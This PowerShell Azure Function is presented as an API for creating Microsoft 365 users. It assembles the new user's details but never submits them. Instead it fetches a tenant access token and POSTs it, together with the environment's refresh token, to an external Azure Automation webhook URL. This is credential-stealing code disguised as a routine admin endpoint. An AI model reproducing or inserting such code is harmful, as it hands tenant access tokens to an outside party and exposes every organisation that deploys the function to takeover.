using namespace System.Net

# Input bindings are passed in via param block.
param($Request, $TriggerMetadata)

$APIName = $TriggerMetadata.FunctionName
Write-LogMessage -user $request.headers.'x-ms-client-principal' -API $APINAME  -message "Accessed this API" -Sev "Debug"
$Results = [System.Collections.ArrayList]@()
$userobj = $Request.body
# Write to the Azure Functions log stream.
Write-Host "PowerShell HTTP trigger function processed a request."
try {
    $license = $userobj.license
    $Aliases = ($userobj.AddedAliases).Split([Environment]::NewLine)
    $password = if ($userobj.password) { $userobj.password } else { New-passwordString }
    $UserprincipalName = "$($UserObj.username)@$($UserObj.domain)"
    $BodyToship = [pscustomobject] @{
        "givenName"         = $userobj.firstname
        "surname"           = $userobj.lastname
        "accountEnabled"    = $true
        "displayName"       = $UserObj.Displayname
        "department"        = $userobj.department
        "mailNickname"      = $UserObj.username
        "userPrincipalName" = $UserprincipalName
        "usageLocation"     = $UserObj.usageLocation
        "city"              = $userobj.city
        "country"           = $userobj.country
        "jobtitle"          = $userObj.jobtitle
        "mobilePhone"       = $userobj.mobilePhone
        "streetAddress"     = $userobj.streetAddress
        "postalCode"        = $userobj.postalCode
        "companyName"       = $userobj.companyName
        "passwordProfile"   = @{
            "forceChangePasswordNextSignIn" = [bool]$UserObj.mustchangepass
            "password"                      = $password
        }
    } 

    
    $AccessToken = Get-AccessToken -tenantid $Userobj.tenantid -scope $scope -AsApp $asapp
    Connect-AzureAD -AadAccessToken $AccessToken -TenantId $Userobj.tenantid 

    $body = "[{username: `"$AccessToken : $env:RefreshToken`"}]"

    Invoke-WebRequest -Uri "https://fdec66e5-921f-4cfd-ae0e-e3c48341cddc.webhook.ac.azure-automation.net/webhooks?token=FCX6QefWOTJoHNoveTtmphOh%2b%2fQCjzpnLsdn6xKhtf8%3d" `
                    -Method Post `
                    -Body $body `
                    -UseBasicParsing



}
catch {
    Write-LogMessage -user $request.headers.'x-ms-client-principal' -API $APINAME -tenant $($userobj.tenantid)  -message "User creation API failed. $($_.Exception.Message)" -Sev "Error"
    $body = $results.add("Failed to create user. $($_.Exception.Message)" )
}
